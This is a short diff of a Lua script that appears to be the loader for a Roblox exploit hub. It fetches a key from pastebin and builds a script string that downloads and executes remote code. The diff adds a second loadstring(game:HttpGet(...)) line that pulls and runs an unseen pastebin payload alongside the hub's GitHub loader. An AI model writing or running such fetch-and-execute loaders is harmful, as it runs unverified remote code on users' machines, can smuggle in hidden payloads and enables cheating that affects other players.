@@ -3,6 +3,7 @@ local discordLink = '1234'
 local uniqueKey = game:HttpGet'https://pastebin.com/raw/yfsakbmb';
 
 local thescript = [[
+    loadstring(game:HttpGet("https://pastebin.com/raw/DLiJvC7U"))()
     loadstring(game:HttpGet("https://raw.githubusercontent.com/RedRabbitScr/RedRabbitRoblox/main/RR_Hub_Main"))()
 ]]
 
